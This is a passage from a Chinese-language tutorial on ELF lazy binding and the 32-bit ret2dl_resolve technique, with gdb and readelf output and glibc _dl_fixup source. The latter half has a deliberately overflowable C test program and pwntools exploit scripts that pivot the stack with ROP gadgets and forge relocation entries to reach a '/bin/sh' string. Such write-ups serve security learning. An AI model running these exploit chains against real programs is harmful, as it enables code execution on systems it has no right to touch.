class="language-bash">gdb-peda$ x/10x 0x80482980x8048298:    0x0804a00c    0x00000107    0x0804a010    0x000003070x80482a8 <span class="token operator">&lt;</span>_init<span class="token operator">></span>:    0x08ec8353    0x0000afe80x4fc38100    0x8b00001d0x80482b8 <span class="token operator">&lt;</span>_init+16<span class="token operator">></span>:    0xfffffc83    0x74c085ffgdb-peda$ </code></pre><p>所以0x0804a00c就是r_offset中的数据 ，0x00000107是r_info中的数据</p><p>再用readelf -r来查看程序的重定位表：</p><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/Freebuf$ readelf -r test1重定位节 <span class="token string">'.rel.dyn'</span> at offset 0x290 contains 1 entry: 偏移量     信息    类型              符号值      符号名称08049ffc  00000206 R_386_GLOB_DAT    00000000   __gmon_start__重定位节 <span class="token string">'.rel.plt'</span> at offset 0x298 contains 2 entries: 偏移量     信息    类型              符号值      符号名称0804a00c  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.00804a010  00000307 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0偏移量即r_offset ,信息即r_info</code></pre><p>可以看到重定位表.rel.plt为一个Elf32_Rel结构体数组，demo程序中该数组包含三个元素，第一个是read的重定位表项Elf32_Rel结构体，第二个是<strong>stack_chk_fail，第三个是</strong>libc_start_main。read的重定位表r_offset为0x0804a00c，为read的got地址，即在动态解析函数完成后，将read的函数地址填入到r_offset为0x0804a00c中。r_info为0x00000107表示read函数的符号表为.dynsym数组中的0x00000107&gt;&gt;8（即0x1）个元素，它的类型为0x00000107&amp;0xff（即0x7）对应为R_386_JUMP_SLOT类型。</p><p>继续来看看dynsym节，由上文，它也是一个结构体Elf32_Sym数组，其定义如下：</p><pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>  Elf32_Word    st_name<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//符号名，是相对.dynstr起始的偏移</span>  Elf32_Addr    st_value<span class="token punctuation">;</span>  Elf32_Word    st_size<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> st_info<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//对于导入函数符号而言，它是0x12</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> st_other<span class="token punctuation">;</span>  Elf32_Section st_shndx<span class="token punctuation">;</span><span class="token punctuation">}</span>Elf32_Sym<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//对于导入函数符号而言，其他字段都是0</span></code></pre><p>其中st_name指向的是函数名称在.dynstr表中的偏移。在dynamic段中我们知道了符号表.dynsym地址为0x80481cc，查看它的值：</p><pre class=" language-bash"><code class="language-bash">gdb-peda$ x/10wx 0x80481cc0x80481cc:    0x00000000    0x00000000    0x00000000    0x000000000x80481dc:    0x0000001a    0x00000000    0x00000000    0x000000120x80481ec:    0x0000003b    0x00000000gdb-peda$ </code></pre><p>同样的也可以用readelf -s查看符号表结构体</p><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/Freebuf$ readelf -s test1Symbol table <span class="token string">'.dynsym'</span> contains 5 entries:   Num:    Value  Size Type    Bind   Vis      Ndx Name     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND      1: 00000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.0 <span class="token punctuation">(</span>2<span class="token punctuation">)</span>     2: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__     3: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.0 <span class="token punctuation">(</span>2<span class="token punctuation">)</span>     4: 080484ec     4 OBJECT  GLOBAL DEFAULT   16 _IO_stdin_usednum 就是.rel.plt结构体中的r_info<span class="token operator">>></span>8,是相对.dynstr起始的偏移,其他数值以此类推显然read相对于dynsym的偏移为1</code></pre><p>果然dynsym第一个元素为read函数的Elf32_Sym结构体。再回到.dynsym地址0x80481cc：第一行就是dynsym表中的第0个结构体的数值内容，第二行就是read函数结构体的数值内容。这两行显然相差16字节，符合(SYMENT)      单个符号表大小  16字节。</p><p>所以read结构体的st_name对应的是0x0000001a，即read字符串应该在.dynstr表偏移为0x2b的地方，由dynamic我们知道了.dynstr表的地址为地址为0x804821c，去验证下看其偏移0x1a是否为read字符串：</p><pre class=" language-bash"><code class="language-bash">gdb-peda$ x/10s 0x804821c0x804821c:    <span class="token string">""</span>0x804821d:    <span class="token string">"libc.so.6"</span>0x8048227:    <span class="token string">"_IO_stdin_used"</span>0x8048236:    <span class="token string">"read"</span>0x804823b:    <span class="token string">"__libc_start_main"</span>0x804824d:    <span class="token string">"GLIBC_2.0"</span>0x8048257:    <span class="token string">"__gmon_start__"</span>0x8048266:    <span class="token string">""</span>0x8048267:    <span class="token string">""</span>0x8048268:    <span class="token string">"\002"</span>gdb-peda$ x/s 0x804821c+0x1a0x8048236:    <span class="token string">"read"</span>gdb-peda$ </code></pre><p>可以看到确实如此。</p><h3 id="大概流程："><a href="#大概流程：" class="headerlink" title="大概流程："></a>大概流程：</h3><ul><li>可以先通过dynamic段获取各个表的地址，包括有字符串表.dynstr的地址为0x804822c，符号表.dynsym地址为0x80481cc，其单个符号表项的大小为16，重定位表.rel.plt的地址为 0x80482d8，其单个重定位表项的大小为8。</li><li>read函数为.rel.plt表中的第一个元素，定位它的重定位表项，知道了read函数的r_offset为0x0804a00c，以及它在符号表中的下标为0x000001，它的类型为0x7，R_386_JUMP_SLOT。</li><li>由0x000001知道了read函数的符号表是.dynsym第二个元素，获取到该结构体，得到了它对应的st_name对应的是0x0000001b，即获取了read字符串应该在.dynstr表偏移为0x1b的地方。</li><li>最后调用函数解析匹配read字符串所对应的函数地址，将其填至r_offset为0x0804a00c，即read的got地址中。</li></ul><h3 id="进入-dl-fixup"><a href="#进入-dl-fixup" class="headerlink" title="进入_dl_fixup:"></a>进入_dl_fixup:</h3><p>有了前面的基础，现在可以跟进去_dl_fixup，我们知道在调用_dl_runtime_resolve函数之前压入到栈中的参数是0，以及got+4中的值，参考下面_dl_fixup的源码，根据参数列表，知道了眼入栈中的0为reloc_arg，got+4中的值为struct link_map *l，函数源码在/elf/dl-runtime.c中：</p><pre class=" language-c"><code class="language-c"><span class="token function">_dl_fixup</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> link_map <span class="token operator">*</span>l<span class="token punctuation">,</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Word<span class="token punctuation">)</span> reloc_arg<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//获取符号表地址</span>  <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Sym<span class="token punctuation">)</span> <span class="token operator">*</span><span class="token keyword">const</span> symtab<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span>DT_SYMTAB<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//获取字符串表地址</span>  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>strtab <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span>DT_STRTAB<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//获取函数对应的重定位表结构地址</span>  <span class="token keyword">const</span> PLTREL <span class="token operator">*</span><span class="token keyword">const</span> reloc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span>DT_JMPREL<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> reloc_offset<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//获取函数对应的符号表结构地址</span>  <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Sym<span class="token punctuation">)</span> <span class="token operator">*</span>sym <span class="token operator">=</span> <span class="token operator">&amp;</span>symtab<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span> <span class="token punctuation">(</span>reloc<span class="token operator">-></span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//得到函数对应的got地址，即真实函数地址要填回的地址</span>  <span class="token keyword">void</span> <span class="token operator">*</span><span class="token keyword">const</span> rel_addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>l<span class="token operator">-></span>l_addr <span class="token operator">+</span> reloc<span class="token operator">-></span>r_offset<span class="token punctuation">)</span><span class="token punctuation">;</span>  DL_FIXUP_VALUE_TYPE value<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//判断重定位表的类型，必须要为7--ELF_MACHINE_JMP_SLOT</span>  <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_TYPE<span class="token punctuation">)</span><span class="token punctuation">(</span>reloc<span class="token operator">-></span>r_info<span class="token punctuation">)</span> <span class="token operator">==</span> ELF_MACHINE_JMP_SLOT<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">/* Look up the target symbol.  If the normal lookup rules are not      used don't look in the global scope.  */</span>   <span class="token comment" spellcheck="true">//需要绕过</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">ELFW</span><span class="token punctuation">(</span>ST_VISIBILITY<span class="token punctuation">)</span> <span class="token punctuation">(</span>sym<span class="token operator">-></span>st_other<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>   <span class="token punctuation">{</span>      <span class="token keyword">const</span> <span class="token keyword">struct</span> r_found_version <span class="token operator">*</span>version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-></span>l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span> <span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> <span class="token operator">*</span>vernum <span class="token operator">=</span>        <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span> <span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> ndx <span class="token operator">=</span> vernum<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span> <span class="token punctuation">(</span>reloc<span class="token operator">-></span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x7fff</span><span class="token punctuation">;</span>      version <span class="token operator">=</span> <span class="token operator">&amp;</span>l<span class="token operator">-></span>l_versions<span class="token punctuation">[</span>ndx<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>version<span class="token operator">-></span>hash <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>   <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>      <span class="token comment" spellcheck="true">// 接着通过strtab+sym->st_name找到符号表字符串</span>      result <span class="token operator">=</span> <span class="token function">_dl_lookup_symbol_x</span> <span class="token punctuation">(</span>strtab <span class="token operator">+</span> sym<span class="token operator">-></span>st_name<span class="token punctuation">,</span> l<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sym<span class="token punctuation">,</span> l<span class="token operator">-></span>l_scope<span class="token punctuation">,</span>                    version<span class="token punctuation">,</span> ELF_RTYPE_CLASS_PLT<span class="token punctuation">,</span> flags<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>      <span class="token comment" spellcheck="true">// value为libc基址加上要解析函数的偏移地址，也即实际地址</span>      value <span class="token operator">=</span> <span class="token function">DL_FIXUP_MAKE_VALUE</span> <span class="token punctuation">(</span>result<span class="token punctuation">,</span>                   sym <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token function">LOOKUP_VALUE_ADDRESS</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span>                      <span class="token operator">+</span> sym<span class="token operator">-></span>st_value<span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">/* We already found the symbol.  The module (and therefore its load     address) is also known.  */</span>      value <span class="token operator">=</span> <span class="token function">DL_FIXUP_MAKE_VALUE</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l<span class="token operator">-></span>l_addr <span class="token operator">+</span> sym<span class="token operator">-></span>st_value<span class="token punctuation">)</span><span class="token punctuation">;</span>      result <span class="token operator">=</span> l<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token comment" spellcheck="true">// 最后把value写入相应的GOT表条目rel_addr中</span>  <span class="token keyword">return</span> <span class="token function">elf_machine_fixup_plt</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> result<span class="token punctuation">,</span> reloc<span class="token punctuation">,</span> rel_addr<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>可以看到_dl_fixup函数就如上面描述的过程一般，去定位结构体，最终获取read字符串去libc中找到相应的函数地址并填回到got表中。</p><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>调用函数时，call func@plt，plt表内容如下：</p><pre class=" language-bash"><code class="language-bash">func@plt:jmp *<span class="token punctuation">(</span>func@GOT<span class="token punctuation">)</span>   //仍然首先进行GOT跳转，尝试是否是第一次链接push n        //压入需要地址绑定的符号在重定位表中的下标jmp PLT0    //跳转到 PLT0</code></pre><p>由于是第一次调用，func@GOTgot表中的值为jmp *(func@GOT)指令的下一条地址，即push n的地址，接着程序会执行push n; jmp PLT0，n则为该函数在.rel.plt表中的偏移。接着去看PLT0的指令为：<br>push *(got+4)<br>jmp *(got+8)</p><p>其中got+4存储的是link_map的地址，got+8存储的是_dl_runtime_resolve函数的地址。进入到_dl_runtime_resolve函数后，函数会调用_dl_fixup函数，根据源码分析，可以看到该函数功能为：</p><ul><li>程序先从第一个参数link_map获取字符串表.dynstr、符号表.dynsym以及重定位表.rel.plt的地址，</li><li>通过第二个参数n即.rel.plt表中的偏移reloc_arg加上.rel.plt的地址获取函数对应的重定位结构的位置，从而获取函数对应的r_offset以及在符号表中的下标r_info&gt;&gt;8。</li><li>根据符号表地址以及下标获取符号结构体，获得了函数符号表中的st_name，即函数名相对于字符串表.dynstr的偏移。</li><li>最后可得到函数名的字符串，然后去libc中匹配函数名，找到相应的函数并将地址填回到r_offset即函数got表中，延迟绑定完成。</li></ul><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>32位的ret2dl_resolve<br>原理<br>ret2dl_resolve的适用场景是在无法泄露程序地址时，通过拦截延迟绑定的过程，实现对函数地址解析过程的劫持，使得最终解析出来的函数为特定函数的函数地址，从而实现无泄露达到特定函数调用的目的。<br>32位ELF程序ret2dl_resolve攻击方法，目前最为普遍的是伪造reloc_arg，即伪造重定位表的下标实现相关的利用，具体包括如下步骤：</p><ul><li>伪造reloc_arg，使得reloc_arg加上.rel.plt的地址指向可控的地址，在该地址可伪造恶意的Elf32_Rel结构体。</li><li>伪造Elf32_Rel结构体中的r_offset指向某一可写地址，最终函数地址会写入该地址处；伪造r_info&amp;0xff为0x7，因为类型需为ELF_MACHINE_JMP_SLOT以绕过类型验证；伪造r_info&gt;&gt;8，使得r_info&gt;&gt;8加上.dynsym地址指向可控的地址，并在该地址伪造符号表结构体Elf32_Sym。</li><li>伪造Elf32_Sym结构体中的st_name，使得.dynstr的地址加上该值指向可控地址，并在该地址处写入特定函数的函数名入system。</li><li>最终系统通过函数名匹配，定位到特定函数地址，获取该地址并写入到伪造的r_offset中，实现了函数地址的获取。</li></ul><p>需要注意一点的是dl_fixup中还存在以下一段代码：</p><pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">ELFW</span><span class="token punctuation">(</span>ST_VISIBILITY<span class="token punctuation">)</span> <span class="token punctuation">(</span>sym<span class="token operator">-></span>st_other<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>   <span class="token punctuation">{</span>      <span class="token keyword">const</span> <span class="token keyword">struct</span> r_found_version <span class="token operator">*</span>version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-></span>l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span> <span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> <span class="token operator">*</span>vernum <span class="token operator">=</span>        <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span> <span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> ndx <span class="token operator">=</span> vernum<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span> <span class="token punctuation">(</span>reloc<span class="token operator">-></span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x7fff</span><span class="token punctuation">;</span>      version <span class="token operator">=</span> <span class="token operator">&amp;</span>l<span class="token operator">-></span>l_versions<span class="token punctuation">[</span>ndx<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>version<span class="token operator">-></span>hash <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>如果reloc-&gt;r_info伪造不当，会使得ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff偏大，导致version = &amp;l-&gt;l_versions[ndx]出现访存错误，因此伪造的reloc-&gt;r_info，最好使得ndx为0，即vernum[reloc-&gt;r_info]为0。</p><p><img src="https://s1.ax1x.com/2020/08/17/dnQOQH.png" alt=""><br><img src="https://s1.ax1x.com/2020/08/17/dnQXyd.png" alt=""></p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token comment" spellcheck="true">//gcc -m32 -fno-stack-protecor -no-pie test2.c -o test2</span><span class="token keyword">void</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Welcome to the Crazy World!\n"</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>溢出点为：112<br>利用思路：<br>1.控制eip为PLT[0]的地址，只需传递一个index_arg参数<br>2.控制index_arg的大小，使reloc的位置落在可控地址内<br>3.伪造reloc的内容，使sym落在可控地址内<br>4.伪造sym的内容，使name落在可控地址内<br>5.伪造name为任意库函数，如system</p><h3 id="step1："><a href="#step1：" class="headerlink" title="step1："></a>step1：</h3><p>直接返回到write@plt</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'test2'</span><span class="token punctuation">)</span>offset <span class="token operator">=</span> <span class="token number">112</span>read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>ppp_ret <span class="token operator">=</span> <span class="token number">0x08048659</span>  <span class="token comment" spellcheck="true">#Using Ropgadget</span>pop_ebp_ret <span class="token operator">=</span> <span class="token number">0x0804865b</span>  <span class="token comment" spellcheck="true">#Using Ropgadget</span>leave_ret <span class="token operator">=</span> <span class="token number">0x08048465</span>  <span class="token comment" spellcheck="true">#Using Ropgadget</span>stack_size <span class="token operator">=</span> <span class="token number">0x400</span>  <span class="token comment" spellcheck="true">#fake chain from bss_addr+0x400</span>bss_addr <span class="token operator">=</span> <span class="token number">0x0804a028</span> base_stage <span class="token operator">=</span> bss_addr <span class="token operator">+</span> stack_size  <span class="token comment" spellcheck="true">#fake chain addr</span>r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./test2'</span><span class="token punctuation">)</span><span class="token keyword">print</span> r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> offsetpayload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#input fake chain </span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>ppp_ret<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#balance the stack</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_stage<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#栈迁移</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_ebp_ret<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#base_stage pop ==>ebp</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_stage<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># mov esp, ebp ; pop ebp ;make esp==>base_stage</span><span class="token comment" spellcheck="true">#gdb.attach(r)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print r.recv()</span>cmd <span class="token operator">=</span> <span class="token string">'/bin/sh'</span>payload2 <span class="token operator">=</span> <span class="token string">'AAAA'</span>  <span class="token comment" spellcheck="true">#response leave-> pop ebp make esp==>write_plt</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> <span class="token string">'AAAA'</span> <span class="token comment" spellcheck="true">#ret_addr meaningless</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_stage<span class="token operator">+</span><span class="token number">80</span><span class="token punctuation">)</span> payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>len<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> cmd<span class="token operator">+</span><span class="token string">'\x00'</span>  <span class="token comment" spellcheck="true">#locate base_stage+80</span>payload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(r)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：成功调用write函数并将/bin/sh打印出来</p><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/Freebuf$ python test2.py <span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/Freebuf/test2'</span>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting local process <span class="token string">'./test2'</span><span class="token keyword">:</span> pid 49059Welcome to the Crazy World<span class="token operator">!</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode/bin/sh<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive$  </code></pre><h3 id="step2："><a href="#step2：" class="headerlink" title="step2："></a>step2：</h3><p>这次控制eip返回PLT[0]，要带上write的index_offset。这里修改一下payload2</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>cmd <span class="token operator">=</span> <span class="token string">'/bin/sh'</span>plt_0 <span class="token operator">=</span> <span class="token number">0x8048370</span> <span class="token comment" spellcheck="true">#using objdump -d -j .plt test2</span>index_offset <span class="token operator">=</span> <span class="token number">0x20</span> <span class="token comment" spellcheck="true">#write`s index from  objump -d -j .plt test2</span>payload2 <span class="token operator">=</span> <span class="token string">'AAAA'</span>  <span class="token comment" spellcheck="true">#response leave-> pop ebp make esp==>write_plt</span><span class="token comment" spellcheck="true">#代替原来的p32(write_plt)</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>plt_0<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#push linkmap</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>index_offset<span class="token 